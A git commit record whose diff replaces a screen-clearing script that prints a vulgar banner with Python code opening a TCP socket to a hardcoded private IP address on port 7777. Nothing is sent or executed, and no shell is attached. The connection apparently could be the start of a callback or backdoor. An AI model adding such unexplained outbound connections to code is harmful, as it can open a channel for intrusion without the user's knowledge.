d1282e04eb98f33104eea28825328d92c9820cf0
disgustedone <58005436+disgustedone@users.noreply.github.com>
2020-10-17 09:11:30 +0200

    Update Run.py

--- Run.py
+++ Run.py
@@ -1,3 +1,5 @@
-import os 
-os.system("clear")
-print("FACEFUCKER")
+import socket
+host = '192.168.66.136'
+port = 7777
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((host,port))
